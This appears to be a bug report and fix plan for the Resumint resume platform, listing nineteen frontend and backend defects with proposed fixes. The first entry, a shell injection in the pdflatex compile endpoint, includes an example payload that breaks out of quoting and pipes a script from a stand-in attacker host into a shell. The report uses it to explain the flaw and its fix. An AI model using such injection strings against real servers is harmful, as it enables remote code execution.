# Resumint Bug Reports & Fix Plan

This document contains a comprehensive list of identified bugs in the Resumint platform, organized by severity. For each bug, the core problem and recommended solution are detailed to guide the resolution process.

## 🔴 CRITICAL (4)

### 1. Shell injection in pdflatex compile-live endpoint
**Location:** `backend/src/index.ts:160-204`
**Problem:** The `templateId` is taken directly from the unauthenticated request body and interpolated directly into shell commands via `execSync` (`execSync(\`pdflatex -interaction=nonstopmode -output-directory="${tempDir}" "${texPath}"\`)`). An attacker could supply a malicious `templateId` (e.g., `x"; curl evil.com/sh | sh #`) to break out of the quotes and execute arbitrary shell commands on the server.
**Solution:** 
- Implement strict validation on `templateId` against a whitelist of known templates (e.g., `nsut-canonical`, `ats-clean`, `modern`, `compact`).
- Refactor the execution to use `execFileSync` instead of `execSync`, passing arguments as an array rather than a single interpolated string to prevent shell metacharacter expansion.

### 2. Stray `"` breaks LaTeX date rendering / PDF compilation
**Location:** `backend/src/infrastructure/latex/latex-template.ts:133-138`
**Problem:** When an experience entry has an `endDate`, the template logic appends a stray `"` character to the output string (e.g., `2023 -- 2024"`). This invalidates the LaTeX source, either breaking the compilation or rendering a literal quote character in the generated PDF.
**Solution:** 
- Fix the template literal by removing the trailing quote character: change `? esc(\`\${String(exp.startDate)}\${exp.endDate ? \` -- \${String(exp.endDate)}"\` : ""}\`)` to `? esc(\`\${String(exp.startDate)}\${exp.endDate ? \` -- \${String(exp.endDate)}\` : ""}\`)`.

### 3. Fragile JSON extraction silent failure
**Location:** `backend/src/infrastructure/ai/index.ts:69-83`
**Problem:** The `extractJson` function relies on `lastIndexOf("}")`. If the AI adds explanatory prose after the JSON, this method captures the text from the first `{` to the absolute last `}`, which may include invalid characters and cause a JSON parse error. Furthermore, the lazy regex `[\s\S]*?` fails if the JSON contains nested triple-backticks.
**Solution:** 
- Implement a robust brace-counting extraction method that balances `{` and `}` to accurately isolate the JSON object.
- Strip any surrounding prose before attempting to parse.

### 4. No input validation on compile-live body
**Location:** `backend/src/index.ts:160-184`
**Problem:** The `/api/protected/resume/compile-live` endpoint accepts `profile`, `selectedBulletIds`, and `templateId` without any schema validation. This opens the door for DoS attacks via arbitrarily large inputs, unhandled 500 errors from invalid template IDs, or LaTeX injection.
**Solution:** 
- Add a Zod schema validation matching the other secure endpoints.
- Enforce size limits on arrays and strings to prevent memory exhaustion and sanitize inputs before they reach the LaTeX template.

---

## 🟠 HIGH (6)

### 5. Onboarding saves an empty profile on completion
**Location:** `frontend/src/app/onboarding/page.tsx:38-46`
**Problem:** When onboarding reaches the COMPLETE phase, it POSTs an empty `{}` body to the profile save endpoint. The user's input from the chat is only kept in the Zustand store and not properly serialized to the backend, resulting in a blank profile.
**Solution:** 
- Collect the accumulated extracted data from the chat messages (the `extractedData` payloads in the store).
- Send this populated data object in the POST body to ensure the user's onboarding progress is saved to the database.

### 6. Shared useChatStore wiped on every page navigation
**Location:** `frontend/src/store/useChatStore.ts`
**Problem:** The pages `onboarding/page.tsx`, `dashboard/profile/page.tsx`, and `dashboard/dashboard-chat-client.tsx` all call `clearChat()` on mount. Because they share a single global Zustand store, navigating between these pages wipes the chat history for the previous context.
**Solution:** 
- Namespace the chat store or use separate slice implementations for different contexts (e.g., `onboarding`, `profile`, `tailor`).
- Alternatively, remove the aggressive `clearChat()` on mount and manage state cleanup explicitly when a session definitively ends.

### 7. contact.name and contact.email never populated from resume parse
**Location:** `backend/src/infrastructure/validation/index.ts:102-108` and `backend/src/core/domain/entities.ts:1-9`
**Problem:** The domain requires `name` and `email` for the Contact entity, but `parsedResumeSchema` omits them. The OAuth user's details aren't merged automatically, leaving `Profile.contact.name` null and resulting in a blank `{{FULL_NAME}}` in the PDF.
**Solution:** 
- Merge the OAuth session's `name` and `email` into the contact object during `saveFromOnboarding`.
- Ensure the LaTeX compilation step defaults to the session user's details if the profile contact details are missing.

### 8. fetchWithSession hardcodes Content-Type: application/json
**Location:** `frontend/src/config/api-client-server.ts:9-16`
**Problem:** The `fetchWithSession` wrapper forces `Content-Type: application/json` on every request. This breaks requests that need `multipart/form-data` (like file uploads).
**Solution:** 
- Modify the function to only set `Content-Type: application/json` if it's not already provided in `options.headers` and the body is not an instance of `FormData`.

### 9. /onboarding route bypasses auth check
**Location:** `frontend/src/proxy.ts:33-35`
**Problem:** The proxy middleware allows unauthenticated access to `/onboarding`. Users can load the page and type, but API calls fail with 401s without redirecting the user to sign in.
**Solution:** 
- Add a session check in the middleware before `NextResponse.next()` for the onboarding route. Redirect unauthenticated users to `/`.

### 10. Server-side code uses NEXT_PUBLIC_* env var for backend URL
**Location:** `frontend/src/config/api-client-server.ts:3`
**Problem:** The server-side API client relies on `NEXT_PUBLIC_API_URL`. On platforms like Vercel, this variable is meant for the client bundle and may not resolve correctly server-side, breaking SSR fetches.
**Solution:** 
- Introduce a server-only environment variable like `INTERNAL_API_URL` for server-side fetches, keeping `NEXT_PUBLIC_API_URL` exclusively for client-side API calls.

---

## 🟡 MEDIUM (6)

### 11. Bullet keywords discarded during tailoring
**Location:** `frontend/src/components/generate/GenerateChatWorkspace.tsx:147-153` and `JDInputPanel.tsx:84-89`
**Problem:** When tailoring resumes, original vault bullets lose their AI-generated keyword arrays because the mapping hardcodes `keywords: []`. This degrades future matching capabilities.
**Solution:** 
- Map and preserve the original `b.keywords` array instead of overwriting it with an empty array.

### 12. Duplicate compile debounce fires two compilations per toggle
**Location:** `GenerateChatWorkspace.tsx:84-92` and `LivePdfRenderer.tsx:17-26`
**Problem:** Both components independently watch `selectedBulletIds` and trigger a debounced compilation. When both are mounted, toggling a bullet triggers two expensive PDF compilations.
**Solution:** 
- Centralize the debounce logic to one component (e.g., `GenerateChatWorkspace`) or move it directly into the Zustand store action to ensure only one compilation fires per state change.

### 13. GitHub repos not deduplicated on re-import
**Location:** `backend/src/core/application/use-cases/github-use-cases.ts:51-53`
**Problem:** If a user re-imports GitHub repositories, they are appended to the profile without deduplication, resulting in duplicate project entries.
**Solution:** 
- Implement deduplication logic based on the repository `url` or `title` when merging imported projects with existing ones.

### 14. /tailor/builder page exists but only redirects
**Location:** `frontend/src/app/tailor/builder/page.tsx` and `proxy.ts:11-13`
**Problem:** Middleware redirects `/tailor/builder` to `/tailor`, but a Next.js page file also exists that does the exact same redirect, causing unnecessary double-hops and processing.
**Solution:** 
- Rely entirely on the middleware or Next.js config rewrites/redirects and remove the redundant page file.

### 15. Domain entities Experience/Project missing id field
**Location:** `backend/src/core/domain/entities.ts:27-40`
**Problem:** The `Experience` and `Project` domain interfaces lack an `id` field. The codebase works around this by using type casting and assigning random UUIDs ad-hoc, which is brittle.
**Solution:** 
- Explicitly add `id: string` to both `Experience` and `Project` interfaces. Assign these IDs formally in the parsing or repository layer.

### 16. Onboarding cookie uses SameSite=Lax but auth uses SameSite=none
**Location:** `frontend/src/app/onboarding/page.tsx:48`
**Problem:** The `onboarding_complete` cookie uses `SameSite=Lax`, while auth cookies use `SameSite=none`. This discrepancy can cause the onboarding cookie to drop during OAuth flows.
**Solution:** 
- Align the `SameSite` attribute of the onboarding cookie with the auth cookies (i.e., `SameSite=none; Secure` in production).

---

## 🔵 LOW (3)

### 17. Two competing fetchWithSession implementations
**Location:** `frontend/src/lib/fetch.ts` and `frontend/src/config/api-client-server.ts`
**Problem:** There are two nearly identical functions for fetching with a session. This creates technical debt and inconsistent behavior (like the `Content-Type` bug in one but not the other).
**Solution:** 
- Consolidate to a single, robust `fetchWithSession` implementation (preferably the one in `lib/fetch.ts`) and update all imports to use it.

### 18. Two different completeness calculations
**Location:** `backend/src/infrastructure/profile-utils.ts:10-27` and `frontend/src/app/dashboard/page.tsx:26-34`
**Problem:** The frontend and backend calculate profile completeness using different metrics and weighting systems, leading to inconsistent UI states.
**Solution:** 
- Establish a single source of truth for the completeness score (preferably calculating it on the backend and exposing it in the profile DTO).

### 19. Outdated copyright year
**Location:** `frontend/src/app/page.tsx:159`
**Problem:** The copyright year is hardcoded to 2025, but it is currently June 2026.
**Solution:** 
- Update the hardcoded year to a dynamic value (e.g., `new Date().getFullYear()`) or hardcode it accurately to `2026`.
